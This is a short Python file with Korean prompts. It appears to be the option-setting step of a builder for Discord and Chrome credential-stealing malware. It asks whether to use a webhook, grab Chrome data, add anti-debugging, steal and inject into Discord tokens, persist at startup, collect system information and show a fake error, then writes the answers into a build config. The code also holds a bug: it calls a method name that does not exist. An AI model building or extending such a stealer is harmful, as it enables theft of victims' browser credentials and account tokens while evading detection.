# 빌드하는데 옵션을 설정하는 파일
import os

from .constants import build_dir, banner

class config_parse:
    def __init__(self):
        self.config_file = os.path.join(build_dir, 'src', 'config.py')
        
        self.opt = self.getopt()
        self.write()

    def get_opt(self) -> dict:
        os.system("cls")
        print(banner)

        webhook = input('{:<27}: '.format('웹훅 입력 (y/n)'))
        chrome = input('{:<27}: '.format('크롬 그랩 (y/n)'))
        antidebug = input('{:<27}: '.format('안티 디버깅 (y/n)'))
        token = input('{:<27}: '.format('디스코드 토큰 (y/n)'))
        injection = input('{:<27}: '.format('디스코드 인젝션 (y/n)'))
        startup = input('{:<27}: '.format('시작프로그램 등록 (y/n)'))
        sysinfo = input('{:<27}: '.format('시스템 정보 (y/n)'))
        fake = input('{:<27}: '.format('가짜오류 (y/n)'))

        if fake.lower() == 'y':
            fakemsg = input('{:<27}: '.format('메시지 (y/n)'))
        return {
            'webhook' : webhook,
            'chrome' : True if chrome == 'y'.lower() else False,
            'debug' : True if antidebug == 'y'.lower() else False,
            'disctoken' : True if token == 'y'.lower() else False,
            'injection' : True if injection == 'y'.lower() else False,
            'startup' : True if startup == 'y'.lower() else False,
            'sysinfo' : True if sysinfo == 'y'.lower() else False,
            'fakeerror' : {
                'use' : True if fake == 'y'.lower() else False,
                'message' : fakemsg if fake == 'y'.lower() else None
            }
        }
    
    def write(self):
        with open(self.config_file, 'w') as f:
            f.write('__CONFIG__' + str(self.opt))